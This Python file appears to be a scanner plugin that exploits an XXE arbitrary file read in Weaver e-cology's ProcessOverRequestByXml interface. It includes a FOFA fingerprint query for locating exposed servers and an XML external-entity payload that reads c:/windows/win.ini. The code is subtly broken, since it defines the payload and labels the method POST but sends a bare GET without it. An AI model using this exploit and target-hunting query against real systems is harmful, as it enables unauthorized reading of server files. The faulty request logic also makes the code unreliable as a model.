#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247486150&idx=1&sn=9b0138cc0cb06187b6dc752daa33774a',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   '泛微e-cology ProcessOverRequestByXml接口任意文件读取',

      'level'     :   'high',

      'FOFA'      :   'body="/js/ecology8" || body="wui/common/css/w7OVFont_wev8.css" || (body="weaver" && body="ecology") || (header="ecology_JSessionId" && body="login/Login.jsp") || body="/wui/index.html" || body="jquery_wev8" && body="/login/Login.jsp?logintype=1"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2024/6/20',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Accept-Encoding': 'gzip, deflate',
      'Content-Type': 'application/xml',
      'Accept': '*/*',
      }
  target = '/rest/ofs/ProcessOverRequestByXml'
  data = '<?xml version="1.0" encoding="utf-8" ?><!DOCTYPE test[<!ENTITY test SYSTEM "file:///c:/windows/win.ini">]><reset><syscode>&test;</syscode></reset>'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'for 16-bit app support',res.text,re.S):
      ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret